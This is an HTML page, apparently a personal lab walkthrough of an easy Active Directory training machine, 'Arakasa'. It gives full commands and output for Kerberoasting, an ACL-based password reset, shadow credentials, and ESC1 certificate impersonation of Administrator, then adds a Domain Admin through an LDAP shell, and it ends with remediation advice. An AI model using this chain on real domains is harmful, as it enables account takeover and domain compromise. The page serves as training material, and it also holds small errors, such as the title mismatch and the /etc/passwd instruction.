@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Walkthrough: PG -Amaterasu</title>
+  <link rel="preconnect" href="https://googleapis.com" />
+  <link rel="preconnect" href="https://gstatic.com" crossorigin />
+  <link href="https://googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;700&display=swap" rel="stylesheet" />
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:        #0d0d0f;
+      --surface:   #141417;
+      --surface2:  #1a1a1f;
+      --border:    #2a2a32;
+      --text:      #e8e8ec;
+      --muted:     #6b6b78;
+      --subtle:    #9898a8;
+      --accent:    #7c6af7;
+      --accent-bg: #1a1730;
+      --green:     #4ade80;
+      --green-bg:  #0d2318;
+      --amber:     #fbbf24;
+      --amber-bg:  #221a00;
+      --red:       #f87171;
+      --red-bg:    #220d0d;
+      --mono:      'JetBrains Mono', monospace;
+      --sans:      'Inter', sans-serif;
+      --radius:    6px;
+    }
+
+    @media (prefers-color-scheme: light) {
+      :root {
+        --bg:        #f8f8fa;
+        --surface:   #ffffff;
+        --surface2:  #f1f1f5;
+        --border:    #e0e0e8;
+        --text:      #111118;
+        --muted:     #9090a0;
+        --subtle:    #555560;
+        --accent:    #5b4de0;
+        --accent-bg: #eeecff;
+        --green:     #16a34a;
+        --green-bg:  #dcfce7;
+        --amber:     #b45309;
+        --amber-bg:  #fef3c7;
+        --red:       #dc2626;
+        --red-bg:    #fee2e2;
+      }
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--mono);
+      font-size: 14px;
+      line-height: 1.7;
+      min-height: 100vh;
+    }
+
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    .site {
+      max-width: 860px;
+      margin: 0 auto;
+      padding: 2rem 1.5rem 4rem;
+    }
+
+    /* NAV */
+    nav {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding-bottom: 1.5rem;
+      border-bottom: 1px solid var(--border);
+      margin-bottom: 3rem;
+    }
+
+    .nav-brand {
+      font-size: 14px;
+      font-weight: 500;
+      color: var(--text);
+    }
+
+    .nav-brand .accent { color: var(--accent); }
+
+    .nav-links {
+      display: flex;
+      gap: 1.5rem;
+    }
+
+    .nav-links a {
+      font-size: 13px;
+      color: var(--subtle);
+    }
+
+    .nav-links a:hover {
+      color: var(--accent);
+      text-decoration: none;
+    }
+
+    /* POST HEADERS & NARRATIVE */
+    .post-header { margin-bottom: 2.5rem; }
+    
+    .eyebrow {
+      font-size: 11px;
+      color: var(--accent);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      margin-bottom: 0.75rem;
+    }
+
+    .post-header h1 {
+      font-family: var(--sans);
+      font-size: 36px;
+      font-weight: 500;
+      color: var(--text);
+      line-height: 1.2;
+      margin-bottom: 0.75rem;
+    }
+
+    .post-meta {
+      display: flex;
+      gap: 15px;
+      align-items: center;
+      font-size: 12px;
+      color: var(--muted);
+      margin-bottom: 1.5rem;
+    }
+
+    .diff {
+      font-size: 11px;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-weight: 500;
+    }
+    .diff-easy { background: var(--green-bg); color: var(--green); }
+    .diff-med  { background: var(--amber-bg); color: var(--amber); }
+    .diff-hard { background: var(--red-bg);   color: var(--red);   }
+
+    p { font-family: var(--sans); color: var(--subtle); margin-bottom: 1.25rem; font-size: 14px; }
+    p em { color: var(--muted); }
+    p strong { color: var(--text); }
+
+    h2 {
+      font-family: var(--sans);
+      font-size: 20px;
+      font-weight: 500;
+      color: var(--text);
+      margin: 3rem 0 1rem;
+      padding-bottom: 0.5rem;
+      border-bottom: 1px solid var(--border);
+    }
+
+    h3 {
+      font-family: var(--sans);
+      font-size: 14px;
+      font-weight: 500;
+      color: var(--text);
+      margin: 1.5rem 0 0.5rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    /* 0xdf SPECIFIC COMPONENT STYLES */
+    .summary-box {
+      background: var(--surface);
+      border-left: 3px solid var(--accent);
+      border-radius: 0 var(--radius) var(--radius) 0;
+      padding: 1.25rem;
+      margin-bottom: 2rem;
+    }
+    .summary-box p { margin-bottom: 0; }
+
+    ul {
+      margin-bottom: 1.5rem;
+      padding-left: 1.25rem;
+    }
+    li {
+      font-family: var(--sans);
+      color: var(--subtle);
+      font-size: 14px;
+      margin-bottom: 0.5rem;
+    }
+    li strong { color: var(--text); }
+
+    /* CODE BLOCKS */
+    code {
+      font-family: var(--mono);
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 13px;
+      color: var(--text);
+    }
+
+    pre {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      padding: 1.25rem;
+      border-radius: var(--radius);
+      overflow-x: auto;
+      margin-bottom: 1.5rem;
+    }
+
+    pre code {
+      background: none;
+      border: none;
+      padding: 0;
+      font-size: 13px;
+      color: var(--text);
+      line-height: 1.5;
+    }
+
+    .prompt-symbol { color: var(--accent); font-weight: bold; }
+    .output-muted { color: var(--muted); }
+    .output-highlight { color: var(--green); }
+
+    /* IMAGES */
+    .screenshot {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 6px;
+      max-width: 100%;
+      height: auto;
+      margin: 1.5rem 0;
+      display: block;
+    }
+
+    /* FOOTER */
+    footer {
+      border-top: 1px solid var(--border);
+      padding-top: 1.5rem;
+      margin-top: 5rem;
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+      color: var(--muted);
+    }
+  </style>
+</head>
+<body>
+
+  <div class="site">
+    <!-- Keep your identical portfolio navigation bar -->
+    <nav>
+      <div class="nav-brand"><span class="accent">~/</span>ajith-g-nayak</div>
+      <div class="nav-links">
+        <a href="../index.html#about">about</a>
+        <a href="../index.html#writeups">writeups</a>
+        <a href="../index.html#projects">projects</a>
+        <a href="../index.html#run-throughs">run-throughs</a>
+        <a href="https://github.com/ajithor" target="_blank" rel="noopener">github</a>
+      </div>
+    </nav>
+
+    <!-- Post Metadata Section -->
+    <header class="post-header">
+      <div class="eyebrow">Hacksmarter Labs Walkthrough</div>
+      <h1>Arakasa</h1>
+      <div class="post-meta">
+        <span>August 5, 2026</span>
+        <span>•</span>
+        <span class="diff diff-easy">Easy</span>
+        <span>•</span>
+        <span>Target IP: 10.1.110.168</span>
+      </div>
+    </header>
+
+    <div class="summary-box">
+      <p><strong>Summary:</strong> Machine starts with assumed breach user, who finds a kerberoastable user. This user has a genericAll over another user, who, in turn hash GenericWrite over another. This user is capable of enrolling in an ESC1 vulnerable template, to impersonate administrator. </p>
+    </div>
+
+    <h3>Attack Chain</h3>
+    <ul>
+      <li><strong>Lateral Movement</strong> (User 2): Assumed breach creds -> Service Account SPN Enumeration -> Kerberoasting Offline Crack</li>
+      <li><strong>Lateral Movement</strong> (User 3): Insecure ACL -> GenericAll Abuse (Targeted Password Reset)</li>
+      <li><strong>Lateral Movement</strong> (User 4): Insecure ACL -> GenericWrite Abuse (Shadow Credentials)</li>
+      <li><strong>Domain Compromise</strong> (Administrator): AD CS Misconfiguration -> ESC1 Certificate Enrollment with SAN Impersonation to LDAP shell -> add user to Domain Admins group</li>
+    </ul>
+
+    <h2>Reconnaissance</h2>
+    <p>Usually, I like to begin with an <code>nmap</code> scan. But since this is a pure AD box, I'll begin with scanning smb-enabled hosts in the network, and generating a hosts list using netexec.</p>
+    <pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> nxc smb 10.1.110.168/24 --generate-hosts-file host
+SMB         10.1.110.168    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:None) (Null Auth:True)
+Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
+                                                                                                                                                                                                                                             
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> cat host          
+10.1.110.168     DC01.hacksmarter.local hacksmarter.local DC01 </code></pre>
+<p>Add this to your <code>/etc/passwd</code> file.<br>Looks like the AD network is only made up of DC. We'll proceed with anonymous enumeration of smb shares, users, rpc and ldap, followed by authenticated enumeration of those, using the assumed breach creds.</p>
+
+<pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> nxc smb 10.1.110.168 -u '' -p '' --shares
+SMB         10.1.110.168    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.110.168    445    DC01             [+] hacksmarter.local\: 
+SMB         10.1.110.168    445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
+                                                                                                                                                                                                                                             
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> nxc smb 10.1.110.168 -u '' -p '' --users 
+SMB         10.1.110.168    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.110.168    445    DC01             [+] hacksmarter.local\: 
+                                                                                                                                                                                                                                             
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> rpcclient -U '%' 10.1.110.168                      
+rpcclient $> enumdomusers
+result was NT_STATUS_ACCESS_DENIED
+rpcclient $> exit
+                                                                                                                                                                                                                                             
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> nxc ldap 10.1.110.168 -u '' -p '' --users
+LDAP        10.1.110.168    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hacksmarter.local) (signing:None) (channel binding:Never) 
+LDAP        10.1.110.168    389    DC01             [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090C21, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
+LDAP        10.1.110.168    389    DC01             [+] hacksmarter.local\: 
+LDAP        10.1.110.168    389    DC01             [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090C21, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c</code> </pre>
+
+<p>Looks like DC is hardened enough to not let any anonymous enumeration. So we'll proceed with the assumed breach creds enumeration <code>faraday:hacksmarter123</code></p>
+
+<h2>Assumed Breach enumeration</h2>
+<pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> nxc smb 10.1.110.168 -u 'faraday' -p 'hacksmarter123' --shares
+SMB         10.1.110.168    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.110.168    445    DC01             [+] hacksmarter.local\faraday:hacksmarter123 
+SMB         10.1.110.168    445    DC01             [*] Enumerated shares
+SMB         10.1.110.168    445    DC01             Share           Permissions     Remark
+SMB         10.1.110.168    445    DC01             -----           -----------     ------
+SMB         10.1.110.168    445    DC01             ADMIN$                          Remote Admin
+SMB         10.1.110.168    445    DC01             C$                              Default share
+SMB         10.1.110.168    445    DC01             IPC$            READ            Remote IPC
+SMB         10.1.110.168    445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.1.110.168    445    DC01             SYSVOL          READ            Logon server share 
+                                                                                                                                                                                                                                             
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> nxc smb 10.1.110.168 -u 'faraday' -p 'hacksmarter123' --users 
+SMB         10.1.110.168    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.110.168    445    DC01             [+] hacksmarter.local\faraday:hacksmarter123 
+SMB         10.1.110.168    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         10.1.110.168    445    DC01             Administrator                 2025-09-18 22:40:20 0       Built-in account for administering the computer/domain 
+SMB         10.1.110.168    445    DC01             Guest                         never             0       Built-in account for guest access to the computer/domain 
+SMB         10.1.110.168    445    DC01             krbtgt                        2025-09-21 02:51:44 0       Key Distribution Center Service Account 
+SMB         10.1.110.168    445    DC01             Goro                          2025-09-21 15:00:31 0       Loyal to a fault 
+SMB         10.1.110.168    445    DC01             alt.svc                       2025-09-21 15:07:42 0       Trapped for eternity 
+SMB         10.1.110.168    445    DC01             Yorinobu                      2025-09-21 15:12:44 0        
+SMB         10.1.110.168    445    DC01             Hanako                        2025-09-21 14:59:03 0       Waiting at embers 
+SMB         10.1.110.168    445    DC01             Faraday                       2025-09-21 15:06:45 0        
+SMB         10.1.110.168    445    DC01             Smasher                       2025-09-21 15:01:20 0        
+SMB         10.1.110.168    445    DC01             Soulkiller.svc                2025-09-21 15:30:13 0       Certificate managment for soulkiller AI 
+SMB         10.1.110.168    445    DC01             Hellman                       2025-09-21 15:04:19 0        
+SMB         10.1.110.168    445    DC01             kei.svc                       2025-09-21 15:05:16 0       Trapped for eternity 
+SMB         10.1.110.168    445    DC01             Silverhand.svc                2025-09-21 15:03:10 0       Trapped for eternity 
+SMB         10.1.110.168    445    DC01             Oda                           2025-09-21 15:02:14 0        
+SMB         10.1.110.168    445    DC01             the_emperor                   2025-11-06 17:19:03 0        
+SMB         10.1.110.168    445    DC01             [*] Enumerated 15 local users: HACKSMARTER
+                                                                                                                                                                                                                                             
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> nxc ldap 10.1.110.168 -u 'faraday' -p 'hacksmarter123' --users
+#same as smb --users
+
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> for pro in smb winrm rdp; do nxc $pro 10.1.110.168 -u 'faraday' -p 'hacksmarter123'; done
+#no shell access</code></pre>
+
+<p>No inteesting or writable shares for the user <code>Faraday</code>. We do find a list of users, identical descriptions from ldap and smb, no "hidden passwords in description". <br>So we proceed with roasting and bloodhound data collections.</p>
+<pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> impacket-GetUserSPNs -dc-ip 10.1.110.168 hacksmarter.local/faraday
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+ServicePrincipalName            Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
+------------------------------  -------  --------  --------------------------  ---------  ----------
+AI/blackwall.hacksmarter.local  alt.svc            2025-09-21 11:07:42.894050  <never>               
+
+
+
+                                                                                                                                                                                                                                             
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> impacket-GetUserSPNs -dc-ip 10.1.110.168 hacksmarter.local/faraday -request-user alt.svc
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+ServicePrincipalName            Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
+------------------------------  -------  --------  --------------------------  ---------  ----------
+AI/blackwall.hacksmarter.local  alt.svc            2025-09-21 11:07:42.894050  <never>               
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*alt.svc$HACKSMARTER.LOCAL$hacksmarter.local/alt.svc*$a<code>REDACTED</code> </code></pre>
+
+<p>We dont find any asrep-roastable users. But we find a kerberoastable user, <code>alt.svc</code>. We request for their hash, and proceed to crack their password.</p>
+<pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> john hash_alt.svc -w=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<code>REDACTED</code>        (?)     
+1g 0:00:00:00 DONE (2026-08-04 23:10) 16.66g/s 8533p/s 8533c/s 8533C/s 123456..letmein
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> for pro in smb winrm rdp; do nxc $pro 10.1.110.168 -u 'alt.svc' -p REDACTED; done
+#no shell access</code></pre>
+
+<p>With this cracked password, we try spraying the creds for any access, and find nothing. So we proceed with bloodhound data collections.</p>
+
+<h2>Bloodhound enumeration and lateral movement</h2>
+<pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> bloodhound-ce-python -u 'alt.svc' -p 'babygirl1' -ns 10.1.110.168 --dns-tcp -d hacksmarter.local -c All --zip</code> </pre>
+
+<p>Upon reviewing bloodhound data, we see alt.svc has <code>GenericAll</code> relation on <code>yorinobu</code> user. Additionally, <code>Yorinobu</code> has a <code>GenericWrite</code> relation on <code>soulkiller.svc</code>. This means, as <code>alt.svc</code>, we can reset <code>Yorinobu</code>'s password. And then, perform a <code>Shadow credentials</code> attack to get NTHash of <code>soulkiller.svc</code>'s password.</p>
+
+<pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> bloodyAD --host 10.1.110.168 -d hacksmarter.local -u alt.svc -p REDACTED set password 'yorinobu' 'newPassword1!'
+[+] Password changed successfully!
+
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> certipy-ad shadow auto -username yorinobu@hacksmarter.local -password 'newPassword1!' -account soulkiller.svc -dc-ip 10.1.110.168
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'Soulkiller.svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '33e996451e7340528ab01058c72b4f15'
+[*] Adding Key Credential with device ID '33e996451e7340528ab01058c72b4f15' to the Key Credentials for 'Soulkiller.svc'
+[*] Successfully added Key Credential with device ID '33e996451e7340528ab01058c72b4f15' to the Key Credentials for 'Soulkiller.svc'
+[*] Authenticating as 'Soulkiller.svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'soulkiller.svc@hacksmarter.local'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'soulkiller.svc.ccache'
+[*] Wrote credential cache to 'soulkiller.svc.ccache'
+[*] Trying to retrieve NT hash for 'soulkiller.svc'
+[*] Restoring the old Key Credentials for 'Soulkiller.svc'
+[*] Successfully restored the old Key Credentials for 'Soulkiller.svc'
+[*] NT hash for 'Soulkiller.svc': REDACTED</code></pre>
+
+<p>I like to crack NTHash, whenever possible, so I know the password, which reveals something about the user who set it. However, this step is not required, as we can proceed by using the NThash itself.</p>
+
+<h2>ADCS enum and attack</h2>
+<pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> certipy-ad find -u 'soulkiller.svc' -hashes REDACTED -dc-ip 10.1.110.168 -stdout -vulnerable -debug
+Certipy v5.0.4 - by Oliver Lyak (ly4k) 
+.
+.
+.
+    Template Name                       : AI_Takeover
+    Display Name                        : AI_Takeover
+    Certificate Authorities             : hacksmarter-DC01-CA
+.
+.
+.
+    [+] User Enrollable Principals      : HACKSMARTER.LOCAL\Soulkiller.svc
+    [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.
+
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> certipy-ad req -u soulkiller.svc -hashes REDACTED -upn Administrator@hacksmarter.local -dc-ip 10.1.110.168 -ca hacksmarter-DC01-CA -template AI_Takeover
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 3
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'Administrator@hacksmarter.local'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> certipy-ad auth -pfx administrator.pfx -dc-ip 10.1.110.168
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator@hacksmarter.local'
+[*] Using principal: 'administrator@hacksmarter.local'
+[*] Trying to get TGT...
+[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_KEY_EXPIRED(Password has expired; change password to reset)
+[-] Use -debug to print a stacktrace
+[-] See the wiki for more information
+</code></pre>
+
+<p>So, we reach the end of outbound controls on bloodhound, and notice the <code>DCOM</code> group. This usually means, if there's a Certificate server running, there's chances of the templates being vulnerable. To test this, we use <code>certipy-ad find</code> option.<br>We see that, it finds an <code>ESC1</code> vulnerable template (which is essentially an Identity theft attack), called <code>AI_Takeover</code>, enrollable by an account we control, <code>soulkiller.svc</code>.<br>So we request the template, while impersonating <code>Administrator.hacksmarter.local</code>, to get the admin's certificate and private key, so that we can then login as the admin.<br><br>vaadata has a good article <a href="https://www.vaadata.com/en/blog/ad-cs-security-understanding-and-exploiting-esc-techniques/">here</a> about vulnerable templates and exploiting them, a good read.</p>
+
+<p>With the admin's .pfx, we try to get a direct shell, but it fails. So we now have to resort to an ldap shell. Ldap shells, while not a shell to the machine itself, gives us a few options, one of which is adding a new users, and customizing their localgroups. Which means, as domain admins, we can add a new user, and make them the admins.</p>
+
+<pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> certipy-ad req -u soulkiller.svc -hashes REDACTED -upn Administrator@hacksmarter.local -dc-ip 10.1.110.168 -ca hacksmarter-DC01-CA -template AI_Takeover -ldap-simple-auth
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 4
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'Administrator@hacksmarter.local'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote certificate and private key to 'administrator.pfx'
+
+<span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> certipy-ad auth -pfx administrator.pfx -dc-ip 10.1.110.168 -ldap-shell 
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator@hacksmarter.local'
+[*] Connecting to 'ldaps://10.1.110.168:636'
+[*] Authenticated to '10.1.110.168' as: 'u:HACKSMARTER\\Administrator'
+Type help for list of commands
+
+# add_user aj
+Attempting to create user in: %s CN=Users,DC=hacksmarter,DC=local
+Adding new user with username: aj and password: @^A1Cnl=^N__e)w result: OK
+
+# add_user_to_group aj "domain admins"
+Adding user: aj to group Domain Admins result: OK
+
+# add_user_to_group aj "remote management users"
+Adding user: aj to group Remote Management Users result: OK
+
+# exit
+Bye!</code></pre>
+<p>So, we now perform another admin impersonation, this time, for an ldap shell. With the new .pfx, we authorize into ldap-shell. Once we login, we can add a new user, and add them to <code>Domain admins</code> and <code>Remote Management Users</code> groups, so we can winrm as a Domain admin.</p>
+
+<pre><code><span class="prompt-symbol">┌──(kali㉿kali)-[~/hack_smarter/arakasa2]
+└─$</span> evil-winrm -i 10.1.110.168 -u 'aj' -p '@^A1Cnl=^N__e)w'
+
+<span class="prompt-symbol">*Evil-WinRM* PS C:\Users\aj\Documents></span> cd \users\administrator\desktop
+<span class="prompt-symbol">*Evil-WinRM* PS C:\users\administrator\desktop></span> dir
+
+
+    Directory: C:\users\administrator\desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         6/21/2016   3:36 PM            527 EC2 Feedback.website
+-a----         6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
+-a----         9/21/2025   3:31 PM             32 root.txt
+</code></pre>
+
+<h2>Remidiations</h2>
+1. Kerberoasting Remediation
+<ul>
+  <li>Strong Passwords: Enforce a minimum 16-character length for service accounts.</li>
+  <li>Managed Accounts: Migrate traditional user accounts running services to Group Managed Service Accounts (gMSAs), which rotate passwords automatically.</li>
+  <li> AES Encryption: Ensure service accounts use AES-128 or AES-256 instead of weak RC4 encryption.</li>
+</ul>
+2. ACL & Object Control Remediation (GenericAll / GenericWrite)
+<ul>
+  <li>Principle of Least Privilege: Audit Active Directory object permissions using tools like BloodHound to find unintended access control lists (ACLs).</li>
+  <li>Remove Direct Assignments: Remove direct user-to-user permissions.</li>
+  <li>Tiered Administration: Implement a Tiered Administration Model (Tier 0/1/2) so standard user accounts cannot possess administrative control over other accounts.</li>
+</ul>
+3. AD CS ESC1 Remediation
+<ul>
+  <li>Disable SAN Enrollment: Uncheck the "Supply in the request" option on the certificate template's Subject Name tab.</li>
+  <li>Require Approval: Enable the "CA administrator approval" setting to prevent automatic issuance.</li>
+  <li>Restrict Enrollment: Limit enrollment permissions strictly to specific, required security groups rather than Authenticated Users.</li>
+</ul>
+
+</div>
+</body>
+</html>
